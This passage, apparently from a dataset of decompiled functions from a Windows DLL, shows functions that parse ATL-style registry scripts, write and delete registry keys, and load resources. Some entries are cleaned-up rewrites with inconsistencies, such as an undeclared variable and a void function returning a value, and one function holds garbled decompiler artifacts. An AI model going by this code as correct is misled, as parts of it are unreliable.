puVar9;\n        return (undefined8 *)this;\n    }\n    \nLAB_1000cc49:\n    FUN_1001dea6();\n    code *pcVar5 = (code *)swi(3);\n    puVar9 = (undefined8 *)(*pcVar5)();\n    return puVar9;\n}"}
{"Function Name": "FUN_1000cc50", "Address": "1000cc50", "Source Code": "void FUN_1000cc50(undefined4 *output_pointer, undefined4 input_value)\n{\n    \n    *output_pointer = input_value;\n}"}
{"Function Name": "Catch_All@1000cf87", "Address": "1000cf87", "Source Code": "void Catch_All_1000cf87(void)\n{\n    int **pointerToPointerToInt; \n    \n    pointerToPointerToInt = (int **)functionCall1((undefined4 *)(basePointer - 0x24), *(undefined4 *)(basePointer - 0x18));\n    \n    \n    functionCall2(*(void **)(basePointer - 0x34), (int *)(basePointer - 0x18), *pointerToPointerToInt);\n    \n    \n    throwException((int *)0x0, (byte *)0x0);\n    \n    \n    ((code *)softwareInterrupt(3))();\n}"}
{"Function Name": "FUN_1000cfb0", "Address": "1000cfb0", "Source Code": "int FUN_1000cfb0(int input1,int input2,undefined4 flag,undefined4 *outputPointer)\n{\n    int result; \n    void *previousExceptionList; \n    previousExceptionList = ExceptionList; \n    ExceptionList = &previousExceptionList; \n    result = FUN_1000d140(input1,input2); \n    FUN_1000c630((void *)(result + 8),(undefined8 *)*outputPointer); \n    _memset((undefined2 *)(result + 0x20),0,0x30); \n    *(undefined4 *)(result + 0x30) = 0; \n    *(undefined4 *)(result + 0x34) = 7; \n    *(undefined2 *)(result + 0x20) = 0; \n    *(undefined4 *)(result + 0x48) = 0; \n    *(undefined4 *)(result + 0x4c) = 7; \n    *(undefined2 *)(result + 0x38) = 0; \n    ExceptionList = previousExceptionList; \n    return result; \n}"}
{"Function Name": "FUN_1000d280", "Address": "1000d280", "Source Code": "void __thiscall FUN_1000d280(void *destinationBuffer, short *sourceArray)\n{\n    uint counter = 0; \n    short *destinationPointer; \n    do {\n        if (*sourceArray == 0) break; \n        *(short *)destinationBuffer = *sourceArray; \n        destinationPointer = (short *)((int)destinationBuffer + 2); \n        if (*sourceArray == 0x27 && counter < 0x206) { \n            *destinationPointer = 0x27; \n            destinationPointer = (short *)((int)destinationBuffer + 4); \n        }\n        counter++; \n        sourceArray++; \n        destinationBuffer = destinationPointer; \n    } while (counter < 0x207); \n    \n    *destinationPointer = 0; \n    return; \n}"}
{"Function Name": "FUN_1000d2d0", "Address": "1000d2d0", "Source Code": "void __fastcall FUN_1000d2d0(HKEY *hkeyArray)\n{\n    \n    if (*hkeyArray != (HKEY)0x0) {\n        \n        RegCloseKey(*hkeyArray);\n    }\n    \n    *hkeyArray = (HKEY)0x0;\n    \n    hkeyArray[1] = (HKEY)0x0;\n}"}
{"Function Name": "FUN_1000d2f0", "Address": "1000d2f0", "Source Code": "int __thiscall FUN_1000d2f0(void *this, LPCWSTR param_1)\n{\n    int *intArrayPointer; \n    uint computedValue; \n    HMODULE moduleHandle; \n    FARPROC functionPointer; \n    int unusedInteger; \n    LSTATUS status; \n    HKEY registryKeyHandle; \n    \n    computedValue = DAT_1004e008 ^ (uint)&stack0xfffffffc;\n    \n    intArrayPointer = *(int **)((int)this + 8);\n    \n    \n    if (intArrayPointer != (int *)0x0) {\n        registryKeyHandle = *this; \n        \n        \n        if (*intArrayPointer == 0) {\n            \n            if (intArrayPointer[1] != 0) goto LAB_1000d3f8;\n        } else {\n            \n            moduleHandle = GetModuleHandleW(L\"Advapi32.dll\");\n            \n            if ((moduleHandle != (HMODULE)0x0) &&\n                \n                (functionPointer = GetProcAddress(moduleHandle, \"RegDeleteKeyTransactedW\"), functionPointer != (FARPROC)0x0)) {\n                \n                return (*functionPointer)(registryKeyHandle, param_1, 0, 0, *intArrayPointer, 0);\n            }\n        }\n        return 1; \n    }\n    \n    \n    if (DAT_100504fc == '\\0') {\n        \n        moduleHandle = GetModuleHandleW(L\"Advapi32.dll\");\n        \n        if (moduleHandle != (HMODULE)0x0) {\n            DAT_100504f8 = GetProcAddress(moduleHandle, \"RegDeleteKeyExW\");\n        }\n        \n        DAT_100504fc = '\\x01';\n    }\n    \n    \n    if (DAT_100504f8 != (FARPROC)0x0) {\n        return (*DAT_100504f8)(*this, param_1, *(undefined4 *)((int)this + 4), 0, computedValue);\n    }\n    registryKeyHandle = *this; \nLAB_1000d3f8:\n    \n    return RegDeleteKeyW(registryKeyHandle, param_1);\n}"}
{"Function Name": "FUN_1000d850", "Address": "1000d850", "Source Code": "undefined4 __fastcall FUN_1000d850(void **functionPointers)\n{\n    code *functionPtr; \n    undefined4 returnValue; \n    int index = 0; \n    void *elementCount = functionPointers[2]; \n    \n    if (0 < (int)elementCount) {\n        do {\n            \n            if ((index < 0) || ((int)elementCount <= index)) {\n                FUN_10007bf0(0xc000008c, 1); \n                functionPtr = (code *)swi(3); \n                return (*functionPtr)(); \n            }\n            \n            thunk_FUN_1001dc78(*(void **)((int)*functionPointers + index * 4));\n            \n            thunk_FUN_1001dc78(*(void **)((int)functionPointers[1] + index * 4));\n            index++; \n        } while (index < (int)elementCount); \n    }\n    \n    if (*functionPointers != (void *)0x0) {\n        FUN_1001dc78(*functionPointers); \n        *functionPointers = (void *)0x0; \n    }\n    \n    if (functionPointers[1] != (void *)0x0) {\n        FUN_1001dc78(functionPointers[1]); \n        functionPointers[1] = (void *)0x0; \n    }\n    functionPointers[2] = (void *)0x0; \n    return 0; \n}"}
{"Function Name": "FUN_1000d8f0", "Address": "1000d8f0", "Source Code": "undefined4 __thiscall FUN_1000d8f0(void *this, undefined8 *param_1, int param_2)\n{\n    uint currentAllocationSize; \n    LPVOID reallocatedMemoryPointer; \n    int currentSize = *this; \n    int newSize = param_2 + 1 + currentSize; \n    \n    if ((currentSize < newSize) && (param_2 < newSize)) {\n        currentAllocationSize = *(uint *)((int)this + 4); \n        \n        if ((int)currentAllocationSize <= newSize) {\n            do {\n                \n                if (0x3fffffff < (int)currentAllocationSize) {\n                    return 0; \n                }\n                currentAllocationSize *= 2; \n                *(uint *)((int)this + 4) = currentAllocationSize; \n            } while ((int)currentAllocationSize <= newSize); \n            \n            if ((int)((ulonglong)currentAllocationSize * 2 >> 0x20) != 0) {\n                return 0; \n            }\n            \n            reallocatedMemoryPointer = CoTaskMemRealloc(*(LPVOID *)((int)this + 8), (SIZE_T)((ulonglong)currentAllocationSize * 2));\n            if (reallocatedMemoryPointer == (LPVOID)0x0) {\n                return 0; \n            }\n            *(LPVOID *)((int)this + 8) = reallocatedMemoryPointer; \n        }\n        \n        if ((currentSize >= 0) && (currentSize < *(int *)((int)this + 4)) && \n            (*(int *)((int)this + 4) - currentSize <= *(int *)((int)this + 4))) {\n            \n            undefined4 operationResult = FUN_10012be0((undefined8 *)(*(int *)((int)this + 8) + currentSize * 2), \n                                               (*(int *)((int)this + 4) - currentSize) * 2, \n                                               param_1, param_2 * 2);\n            FUN_1000d1b0(operationResult); \n            *(int *)this = *this + param_2; \n            *(undefined2 *)(*(int *)((int)this + 8) + *this * 2) = 0; \n            return 1; \n        }\n    }\n    return 0; \n}"}
{"Function Name": "FUN_1000dbb0", "Address": "1000dbb0", "Source Code": "void FUN_1000dbb0(LPCWSTR libraryPath, LPCWSTR resourceType, LPCWSTR resourceName)\n{\n    code *functionPointer; \n    longlong allocationSize; \n    HMODULE moduleHandle; \n    HRSRC resourceHandle; \n    HGLOBAL resourceMemory; \n    DWORD resourceSize; \n    uint unsignedSize; \n    uint securityCookie; \n    undefined *localMemoryPointer; \n    undefined localBuffer[1024]; \n    uint securityCookieValue; \n    void *originalExceptionList; \n    undefined *stackPointer; \n    stackPointer = &LAB_10038af3; \n    originalExceptionList = ExceptionList; \n    securityCookie = DAT_1004e008 ^ (uint)&stack0xfffffffc; \n    ExceptionList = &originalExceptionList; \n    securityCookieValue = securityCookie; \n    _memset(&localMemoryPointer, 0, 0x404); \n    localMemoryPointer = (undefined *)0x0; \n    moduleHandle = LoadLibraryExW(libraryPath, (HANDLE)0x0, 0x60); \n    if ((moduleHandle == (HMODULE)0x0) && (moduleHandle = LoadLibraryExW(libraryPath, (HANDLE)0x0, 2), moduleHandle == (HMODULE)0x0)) { \n        FUN_1000d250(); \n    } else {\n        resourceHandle = FindResourceW(moduleHandle, resourceType, resourceName); \n        if (resourceHandle == (HRSRC)0x0) { \n            FUN_1000d250(); \n        } else {\n            resourceMemory = LoadResource(moduleHandle, resourceHandle); \n            if (resourceMemory == (HGLOBAL)0x0) { \n                FUN_1000d250(); \n            } else {\n                resourceSize = SizeofResource(moduleHandle, resourceHandle); \n                if (resourceSize <= resourceSize + 1) { \n                    allocationSize = (ulonglong)(resourceSize + 1) * 2; \n                    unsignedSize = (uint)allocationSize; \n                    if ((int)((ulonglong)allocationSize >> 0x20) != 0) { \n                        FUN_10007c20(0x80070216); \n                        functionPointer = (code *)swi(3); \n                        (*functionPointer)(); \n                        return; \n                    }\n                    if (0x400 < unsignedSize) { \n                        FUN_100120f0(&localMemoryPointer, unsignedSize); \n                        FUN_1000dd24(); \n                        return; \n                    }\n                    localMemoryPointer = localBuffer; \n                    FUN_1000dd24(); \n                    return; \n                }\n            }\n        }\n    }\n    if (moduleHandle != (HMODULE)0x0) { \n        FreeLibrary(moduleHandle); \n    }\n    if (localMemoryPointer != localBuffer) { \n        FUN_10011de0(&localMemoryPointer); \n    }\n    ExceptionList = originalExceptionList; \n    ___security_check_cookie_4(securityCookieValue ^ (uint)&stack0xfffffffc); \n    return; \n}"}
{"Function Name": "FUN_1000ddd0", "Address": "1000ddd0", "Source Code": "void FUN_1000ddd0(int input_value) \n{\n    FUN_1000d850((void **)(input_value + 4)); \n}"}
{"Function Name": "FUN_1000ddf0", "Address": "1000ddf0", "Source Code": "LPCWSTR __fastcall FUN_1000ddf0(LPWSTR inputString, WCHAR targetChar)\n{\n    \n    if (inputString == (LPWSTR)0x0) {\n        return (LPCWSTR)0x0; \n    }\n    \n    \n    while (*inputString != L'\\0') {\n        \n        if (*inputString == targetChar) {\n            return (LPCWSTR)inputString; \n        }\n        \n        inputString = CharNextW(inputString);\n    }\n    \n    \n    return (LPCWSTR)0x0;\n}"}
{"Function Name": "FUN_1000e050", "Address": "1000e050", "Source Code": "void __thiscall FUN_1000e050(void *this,HKEY *param_1,int *param_2,undefined2 *param_3)\n{\nbyte bVar1;\nWCHAR WVar2;\nshort sVar3;\ncode *pcVar4;\nlonglong lVar5;\nint iVar6;\nuint uVar7;\nHRESULT HVar8;\nLPWSTR lpsz;\nLPCWSTR lpsz_00;\nchar *pcVar9;\nWCHAR *pWVar10;\nundefined4 *puVar11;\nint extraout_ECX;\nchar **ppcVar12;\nchar extraout_DL;\nbyte *pbVar13;\nchar cVar14;\nvoid *pvVar15;\nvoid *_Size;\nundefined4 *puVar16;\nuint uVar17;\nDWORD cbData;\nbool bVar18;\nchar cVar19;\nuint uStack_214c;\nundefined4 *local_2128;\nundefined4 local_2124 [64];\nvoid *local_2024;\nvoid *local_2020;\nvoid *local_201c;\nWCHAR local_2018;\nundefined local_2016 [8190];\nuint local_18;\nuint *local_14;\nvoid *local_10;\nundefined *puStack_c;\nundefined4 local_8;\nlocal_8 = 0xffffffff;\npuStack_c = &LAB_10038b36;\nlocal_10 = ExceptionList;\nuStack_214c = DAT_1004e008 ^ (uint)&stack0xfffffffc;\nlocal_14 = &uStack_214c;\nExceptionList = &local_10;\nlocal_2020 = this;\nlocal_18 = uStack_214c;\niVar6 = FUN_1000de90(this,&local_2018);\nif (-1 < iVar6) {\niVar6 = lstrcmpiW(&local_2018,L\"S\");\nif (iVar6 == 0) {\nuVar17 = 8;\n}\nelse {\niVar6 = lstrcmpiW(&local_2018,L\"M\");\nif (iVar6 == 0) {\nuVar17 = 0x4008;\n}\nelse {\niVar6 = lstrcmpiW(&local_2018,L\"D\");\nif (iVar6 == 0) {\nuVar17 = 0x13;\n}\nelse {\niVar6 = lstrcmpiW(&local_2018,L\"B\");\nif (iVar6 != 0) goto LAB_1000e547;\nuVar17 = 0x11;\n}\n}\n}\nFUN_1000de40((LPCWSTR *)this);\niVar6 = FUN_1000de90(this,&local_2018);\nif (-1 < iVar6) {\nif (uVar17 < 0x14) {\nif (uVar17 == 0x13) {\nlocal_201c = (void *)0x0;\nHVar8 = VarUI4FromStr(&local_2018,0,0,(ULONG *)&local_2024);\nif (-1 < HVar8) {\nlocal_2020 = local_2024;\nuVar17 = RegSetValueExW(*param_1,(LPCWSTR)param_2,0,4,(BYTE *)&local_2020,4);\nFUN_1000b490(&local_201c);\ngoto LAB_1000e519;\n}\nFUN_1000b490(&local_201c);\n}\nelse if (uVar17 == 8) {\npWVar10 = &local_2018;\ndo {\nWVar2 = *pWVar10;\npWVar10 = pWVar10 + 1;\n} while (WVar2 != L'\\0');\nuVar17 = RegSetValueExW(*param_1,(LPCWSTR)param_2,0,1,(BYTE *)&local_2018,\n((int)pWVar10 - (int)local_2016 >> 1) * 2 + 2);\nLAB_1000e519:\nif (uVar17 == 0) goto LAB_1000e526;\nFUN_1000d270(uVar17);\n}\nelse {\nif (uVar17 != 0x11) goto LAB_1000e526;\npWVar10 = &local_2018;\ndo {\nWVar2 = *pWVar10;\npWVar10 = pWVar10 + 1;\n} while (WVar2 != L'\\0');\npvVar15 = (void *)((int)pWVar10 - (int)local_2016 >> 1);\nlocal_2024 = pvVar15;\nif (((uint)pvVar15 & 1) == 0) {\n_Size = (void *)((int)pvVar15 - ((int)pWVar10 - (int)local_2016 >> 0x1f) >> 1);\nlocal_201c = _Size;\n_memset(&local_2128,0,0x104);\nlocal_2128 = (undefined4 *)0x0;\nlocal_8 = 4;\nif (_Size < (void *)0x101) {\nlocal_2128 = local_2124;\n}\nelse {\nFUN_100120f0(&local_2128,(size_t)_Size);\n}\nif (local_2128 != (undefined4 *)0x0) {\n_memset(local_2128,0,(size_t)_Size);\nuVar17 = 0;\nif (0 < (int)pvVar15) {\ndo {\ncVar14 = (char)*(undefined2 *)(local_2016 + uVar17 * 2 + -2);\nswitch(*(undefined2 *)(local_2016 + uVar17 * 2 + -2)) {\ncase 0x30:\ncase 0x31:\ncase 0x32:\ncase 0x33:\ncase 0x34:\ncase 0x35:\ncase 0x36:\ncase 0x37:\ncase 0x38:\ncase 0x39:\ncVar14 = cVar14 + -0x30;\nbreak;\ndefault:\ncVar14 = '\\0';\nbreak;\ncase 0x41:\ncase 0x42:\ncase 0x43:\ncase 0x44:\ncase 0x45:\ncase 0x46:\ncVar14 = cVar14 + -0x37;\nbreak;\ncase 0x61:\ncase 0x62:\ncase 99:\ncase 100:\ncase 0x65:\ncase 0x66:\ncVar14 = cVar14 + -0x57;\n}\nuVar7 = uVar17 & 1;\npbVar13 = (byte *)((uVar17 >> 1) + (int)local_2128);\nuVar17 = uVar17 + 1;\n*pbVar13 = *pbVar13 | cVar14 << (4U - (char)(uVar7 << 2) & 0x1f);\n_Size = local_201c;\n} while ((int)uVar17 < (int)pvVar15);\n}\nuVar17 = RegSetValueExW(*param_1,(LPCWSTR)param_2,0,3,(BYTE *)local_2128,(DWORD)_Size)\n;\nif (local_2128 != local_2124) {\nFUN_10011de0(&local_2128);\n}\ngoto LAB_1000e519;\n}\nFUN_10011de0(&local_2128);\n}\n}\n}\nelse {\nif (uVar17 == 0x4008) {\npWVar10 = &local_2018;\ndo {\nWVar2 = *pWVar10;\npWVar10 = pWVar10 + 1;\n} while (WVar2 != L'\\0');\n_memset(&local_2128,0,0x104);\nlocal_2128 = (undefined4 *)0x0;\nlocal_8 = 1;\nlVar5 = (ulonglong)(((int)pWVar10 - (int)local_2016 >> 1) + 2) * 2;\nuVar17 = (uint)lVar5;\nbVar18 = (int)((ulonglong)lVar5 >> 0x20) == 0;\nif (!bVar18) {\ncVar19 = '\\0';\ncVar14 = '\\0';\npcVar9 = (char *)FUN_10007c20(0x80070216);\nif (!bVar18 && cVar19 == cVar14) {\n*pcVar9 = *pcVar9 + extraout_DL;\npbVar13 = (byte *)(pcVar9 + -0x72efff1e);\nbVar1 = *pbVar13;\n*pbVar13 = *pbVar13 + (byte)extraout_ECX;\nppcVar12 = (char **)(extraout_ECX + -1);\ncVar14 = (char)pcVar9;\n*pcVar9 = *pcVar9 + cVar14 + CARRY1(bVar1,(byte)extraout_ECX);\n*pcVar9 = *pcVar9 + cVar14;\n*pcVar9 = *pcVar9 + cVar14;\n*pcVar9 = *pcVar9 + cVar14;\n*pcVar9 = *pcVar9 + cVar14;\n*(char *)param_2 = *(char *)param_2 + cVar14;\npcVar9 = pcVar9 + *param_2 + *param_2 + *param_2;\n*ppcVar12 = *ppcVar12 + (int)pcVar9;\n*ppcVar12 = *ppcVar12 + (int)pcVar9;\n*ppcVar12 = *ppcVar12 + (int)pcVar9;\npcVar4 = (code *)swi(3);\n(*pcVar4)();\nreturn;\n}\ngoto LAB_1000e554;\n}\nif (0x100 < uVar17) {\nFUN_100120f0(&local_2128,uVar17);\nFUN_1000e44e();\nreturn;\n}\nlocal_2128 = local_2124;\nif (local_2128 == (undefined4 *)0x0) {\nuVar17 = 0xe;\n}\nelse {\nlpsz_00 = &local_2018;\npuVar16 = local_2128;\nwhile (local_2018 != L'\\0') {\nlpsz = CharNextW(lpsz_00);\nif ((*lpsz_00 == L'\\\\') && (*lpsz == L'0')) {\n*(undefined2 *)puVar16 = 0;\nlpsz_00 = CharNextW(lpsz);\n}\nelse {\n*(WCHAR *)puVar16 = *lpsz_00;\nlpsz_00 = lpsz_00 + 1;\n}\npuVar16 = (undefined4 *)((int)puVar16 + 2);\nlocal_2018 = *lpsz_00;\n}\n*puVar16 = 0;\nif (local_2128 == (undefined4 *)0x0) {\nuVar17 = 0xd;\n}\nelse {\ncbData = 0;\npuVar16 = local_2128;\ndo {\npuVar11 = puVar16;\ndo {\nsVar3 = *(short *)puVar11;\npuVar11 = (undefined4 *)((int)puVar11 + 2);\n} while (sVar3 != 0);\niVar6 = ((int)puVar11 - (int)((int)puVar16 + 2) >> 1) + 1;\npuVar16 = (undefined4 *)((int)puVar16 + iVar6 * 2);\ncbData = cbData + iVar6 * 2;\n} while (iVar6 != 1);\nuVar17 = RegSetValueExW(*param_1,(LPCWSTR)param_2,0,7,(BYTE *)local_2128,cbData);\n}\n}\nif (local_2128 != local_2124) {\nFUN_10011de0(&local_2128);\n}\ngoto LAB_1000e519;\n}\nLAB_1000e526:\nFUN_1000de90(this,param_3);\n}\n}\n}\nLAB_1000e547:\nExceptionList = local_10;\nLAB_1000e554:\nuStack_214c = 0x1000e55f;\n___security_check_cookie_4(local_18 ^ (uint)&stack0xfffffffc);\nreturn;\n}\nLocal Variable: local_8 : undefined4\nLocal Variable: local_10 : undefined1\nLocal Variable: local_14 : undefined4\nLocal Variable: local_18 : undefined4\nLocal Variable: local_2016 : undefined2\nLocal Variable: local_2018 : undefined2\nLocal Variable: local_201c : undefined4\nLocal Variable: local_2020 : undefined4\nLocal Variable: local_2024 : undefined4\nLocal Variable: local_2124 : undefined1\nLocal Variable: local_2128 : undefined4\nLocal Variable: local_212c : undefined4\nLocal Variable: local_2130 : undefined4\nLocal Variable: local_2134 : undefined4\nLocal Variable: local_2138 : undefined4\nLocal Variable: local_213c : undefined4"}
{"Function Name": "FUN_1000e5c0", "Address": "1000e5c0", "Source Code": "undefined4 FUN_1000e5c0(LPCWSTR inputString)\n{\n    undefined **appIDPointer = &PTR_u_AppID_10048470; \n    do {\n        if (lstrcmpiW(inputString, (LPCWSTR)*appIDPointer) == 0) { \n            return 0; \n        }\n        appIDPointer++; \n    } while ((int)appIDPointer < 0x100484a0); \n    return 1; \n}"}
{"Function Name": "FUN_1000e600", "Address": "1000e600", "Source Code": "void FUN_1000e600(HKEY registryKey) \n{\n    LSTATUS status; \n    DWORD subkeyCount = 0; \n    uint securityCookie = DAT_1004e008 ^ (uint)&stack0xfffffffc; \n    \n    status = RegQueryInfoKeyW(registryKey, (LPWSTR)0x0, (LPDWORD)0x0, (LPDWORD)0x0, &subkeyCount, (LPDWORD)0x0,\n                              (LPDWORD)0x0, (LPDWORD)0x0, (LPDWORD)0x0, (LPDWORD)0x0, (LPDWORD)0x0,\n                              (PFILETIME)0x0);\n    \n    \n    ___security_check_cookie_4(securityCookie ^ (uint)&stack0xfffffffc);\n    return; \n}"}
{"Function Name": "FUN_1000e670", "Address": "1000e670", "Source Code": "void __thiscall FUN_1000e670(void *this, short *param_1)\n{\n    int returnValue; \n    uint securityCookie; \n    \n    securityCookie = DAT_1004e008 ^ (uint)&stack0xfffffffc;\n    \n    if ((*param_1 == 0x3d) && (returnValue = FUN_1000de90(this, param_1), -1 < returnValue)) {\n        \n        FUN_1000de40((LPCWSTR *)this);\n        \n        if ((returnValue = FUN_1000de90(this, local_2008), -1 < returnValue)) {\n            \n            FUN_1000de90(this, param_1);\n        }\n    }\n    \n    ___security_check_cookie_4(securityCookie ^ (uint)&stack0xfffffffc);\n    return; \n}"}
{"Function Name": "FUN_1000ea20", "Address": "1000ea20", "Source Code": "void __thiscall FUN_1000ea20(void *this, undefined (*inputParam)[16], int functionParam)\n{\n    WCHAR firstWideChar; \n    HKEY registryKeyHandle; \n    int functionReturnValue; \n    uint loopIndex; \n    WCHAR *wideCharStringPointer = NULL; \n    WCHAR wideCharBuffer[4096]; \n    uint stackSecurityCookie = DAT_1004e008 ^ (uint)&stack0xfffffffc; \n    \n    functionReturnValue = FUN_1000e6e0(this, inputParam, &wideCharStringPointer);\n    if (functionReturnValue < 0) { \n        goto LAB_1000eac4; \n    }\n    *(WCHAR **)this = wideCharStringPointer; \n    firstWideChar = *wideCharStringPointer; \njoined_r0x1000ea6a:\n    \n    if ((firstWideChar == L'\\0') || (functionReturnValue = FUN_1000de90(this, wideCharBuffer), functionReturnValue < 0)) {\n        goto LAB_1000eab6; \n    }\n    \n    functionReturnValue = 0; \n    loopIndex = 0; \n    \n    while (lstrcmpiW(wideCharBuffer, *(LPCWSTR *)((int)&PTR_u_HKCR_10048400 + loopIndex)) != 0) {\n        loopIndex += 8; \n        functionReturnValue++; \n        if (0x6f < loopIndex) { \n            goto LAB_1000eab6; \n        }\n    }\n    \n    registryKeyHandle = (HKEY)(&DAT_10048404)[functionReturnValue * 2]; \n    \n    if ((registryKeyHandle == (HKEY)0x0) || (functionReturnValue = FUN_1000de90(this, wideCharBuffer), functionReturnValue < 0) || (wideCharBuffer[0] != L'{'))) {\n        goto LAB_1000eab6; \n    }\n    \n    \n    if (functionParam == 0) {\n        functionReturnValue = FUN_1000ebc0(this, wideCharBuffer, registryKeyHandle, 0, 0);\n        if (functionReturnValue < 0) { \n            goto LAB_1000eab6; \n        }\n    } else {\n        int previousState = *(int *)this; \n        \n        functionReturnValue = FUN_1000ebc0(this, wideCharBuffer, registryKeyHandle, functionParam, 0);\n        if (functionReturnValue < 0) { \n            *(int *)this = previousState; \n            FUN_1000ebc0(this, wideCharBuffer, registryKeyHandle, 0, 0); \n            goto LAB_1000eab6; \n        }\n    }\n    do {\n        firstWideChar = **this; \n        switch (firstWideChar) { \n            case L'\\t': \n            case L'\\n': \n            case L'\\r': \n            case L' ': \n                *(LPWSTR *)this = CharNextW(*this); \n                break;\n            default:\n                goto switchD_1000eb79_caseD_b; \n        }\n    } while (true); \nswitchD_1000eb79_caseD_b:\n    goto joined_r0x1000ea6a; \nLAB_1000eab6:\n    CoTaskMemFree(wideCharStringPointer); \nLAB_1000eac4:\n    ___security_check_cookie_4(stackSecurityCookie ^ (uint)&stack0xfffffffc); \n    return; \n}"}
{"Function Name": "FUN_1000ebc0", "Address": "1000ebc0", "Source Code": "void __thiscall FUN_1000ebc0(void *this,LPCWSTR param_1,HKEY param_2,int param_3,int param_4)\n{\nWCHAR WVar1;\nint *piVar2;\nint iVar3;\nint iVar4;\nLPCWSTR pWVar5;\nHKEY pHVar6;\nuint uVar7;\nHMODULE hModule;\nFARPROC pFVar8;\nundefined4 uVar9;\nundefined **ppuVar10;\nulonglong local_2260;\nint *local_2258;\nHKEY local_2254;\nHKEY local_2250;\nint local_224c;\nint local_2248;\nHKEY local_2244;\nundefined4 local_2240;\nundefined4 local_223c;\nDWORD local_2238;\nulonglong local_2234;\nundefined4 local_222c;\nHKEY local_2228;\nundefined4 local_2224;\nundefined4 local_2220;\nint local_221c [2048];\nwchar_t local_21c [260];\nuint local_14;\nvoid *local_10;\nundefined *puStack_c;\nundefined4 local_8;\npuStack_c = &LAB_10038ba6;\nlocal_10 = ExceptionList;\nlocal_14 = DAT_1004e008 ^ (uint)&stack0xfffffffc;\nExceptionList = &local_10;\nlocal_2260 = 0;\nlocal_2258 = (int *)0x0;\nlocal_8._0_1_ = 0;\nlocal_8._1_3_ = 0;\niVar3 = FUN_1000de90(this,param_1);\nif (-1 < iVar3) {\nWVar1 = *param_1;\nwhile (WVar1 != L'}') {\nlocal_2254 = (HKEY)0x1;\niVar3 = lstrcmpiW(param_1,L\"Delete\");\niVar4 = lstrcmpiW(param_1,L\"ForceRemove\");\nif ((iVar4 == 0) || (iVar3 == 0)) {\niVar4 = FUN_1000de90(this,param_1);\nif (iVar4 < 0) break;\nif (param_3 == 0) goto LAB_1000eda5;\nWVar1 = *param_1;\nlocal_2228 = (HKEY)0x0;\nlocal_2224 = 0;\nlocal_2220 = 0;\npWVar5 = param_1;\nwhile (WVar1 != L'\\0') {\nif (WVar1 == L'\\\\') {\nif (pWVar5 != (LPCWSTR)0x0) goto LAB_1000f357;\nbreak;\n}\npWVar5 = CharNextW(pWVar5);\nWVar1 = *pWVar5;\n}\nppuVar10 = &PTR_u_AppID_10048470;\ndo {\niVar4 = lstrcmpiW(param_1,(LPCWSTR)*ppuVar10);\nif (iVar4 == 0) goto LAB_1000ed5e;\nppuVar10 = (undefined **)((LPCWSTR *)ppuVar10 + 1);\n} while ((int)ppuVar10 < 0x100484a0);\nlocal_2228 = param_2;\nlocal_2224 = 0;\nlocal_2220 = 0;\nFUN_1000d510(&local_2228,param_1);\nlocal_2228 = (HKEY)0x0;\nlocal_2220 = 0;\nLAB_1000ed5e:\nif (iVar3 != 0) {\nlocal_2224 = 0;\ngoto LAB_1000eda5;\n}\niVar3 = FUN_1000de90(this,param_1);\nif ((iVar3 < 0) || (iVar3 = FUN_1000e670(this,param_1), iVar3 < 0)) break;\nlocal_2224 = 0;\nLAB_1000f0e1:\nif (*param_1 == L'{') {\npWVar5 = param_1;\ndo {\nWVar1 = *pWVar5;\npWVar5 = pWVar5 + 1;\n} while (WVar1 != L'\\0');\nif ((int)pWVar5 - (int)(param_1 + 1) >> 1 == 1) {\niVar3 = FUN_1000ebc0(this,param_1,(HKEY)local_2260,param_3,0);\nif ((iVar3 < 0) || (iVar3 = FUN_1000de90(this,param_1), iVar3 < 0)) break;\n}\n}\n}\nelse {\nLAB_1000eda5:\npHVar6 = (HKEY)lstrcmpiW(param_1,L\"NoRemove\");\nif ((pHVar6 == (HKEY)0x0) &&\n(local_2254 = pHVar6, iVar3 = FUN_1000de90(this,param_1), iVar3 < 0)) break;\niVar3 = lstrcmpiW(param_1,L\"Val\");\nif (iVar3 == 0) {\niVar3 = FUN_1000de90(this,(undefined2 *)local_221c);\nif (((iVar3 < 0) || (iVar3 = FUN_1000de90(this,param_1), iVar3 < 0)) || (*param_1 != L'=')\n) break;\nif (param_3 != 0) {\nlocal_8._0_1_ = 1;\nlocal_2234 = ZEXT48(param_2);\nlocal_222c = 0;\niVar3 = FUN_1000e050(this,(HKEY *)&local_2234,local_221c,param_1);\nlocal_2234 = 0;\nlocal_222c = 0;\nif (-1 < iVar3) {\nlocal_8._0_1_ = 0;\nlocal_2234 = 0;\ngoto LAB_1000f0e1;\n}\nbreak;\n}\nif ((param_4 == 0) && (local_2254 != (HKEY)0x0)) {\nlocal_2244 = (HKEY)0x0;\nlocal_2240 = 0;\nlocal_223c = 0;\nuVar7 = FUN_1000d420(&local_2244,param_2,(LPCWSTR)0x0,0x20006);\npHVar6 = local_2244;\nif (uVar7 != 0) {\nFUN_1000d270(uVar7);\nif (local_2244 != (HKEY)0x0) {\nRegCloseKey(local_2244);\n}\nbreak;\n}\nuVar7 = RegDeleteValueW(local_2244,(LPCWSTR)local_221c);\nif ((uVar7 != 0) && (uVar7 != 2)) {\nFUN_1000d270(uVar7);\nif (pHVar6 != (HKEY)0x0) {\nRegCloseKey(pHVar6);\n}\nbreak;\n}\nif (pHVar6 != (HKEY)0x0) {\nRegCloseKey(pHVar6);\nlocal_2244 = (HKEY)0x0;\n}\nlocal_2240 = 0;\n}\niVar3 = FUN_1000e670(this,param_1);\nif (-1 < iVar3) goto LAB_1000f309;\nbreak;\n}\nWVar1 = *param_1;\npWVar5 = param_1;\nwhile (WVar1 != L'\\0') {\nif (WVar1 == L'\\\\') {\nif (pWVar5 != (LPCWSTR)0x0) goto LAB_1000f357;\nbreak;\n}\npWVar5 = CharNextW(pWVar5);\nWVar1 = *pWVar5;\n}\nif (param_3 != 0) {\niVar3 = FUN_1000d420(&local_2260,param_2,param_1,0x2001f);\nif ((iVar3 != 0) &&\n(iVar3 = FUN_1000d420(&local_2260,param_2,param_1,0x20019), piVar2 = local_2258,\niVar3 != 0)) {\nlocal_8 = CONCAT31(local_8._1_3_,2);\nlocal_2254 = (HKEY)0x0;\nif (local_2258 == (int *)0x0) {\nLAB_1000f04f:\nuVar7 = RegCreateKeyExW(param_2,param_1,0,(LPWSTR)0x0,0,0x2001f,\n(LPSECURITY_ATTRIBUTES)0x0,&local_2254,&local_2238);\n}\nelse if (*local_2258 == 0) {\nif (local_2258[1] != 0) goto LAB_1000f04f;\nLAB_1000f048:\nuVar7 = 1;\n}\nelse {\nhModule = GetModuleHandleW(L\"Advapi32.dll\");\nif (hModule == (HMODULE)0x0) {\nuVar7 = 1;\n}\nelse {\npFVar8 = GetProcAddress(hModule,\"RegCreateKeyTransactedW\");\nif (pFVar8 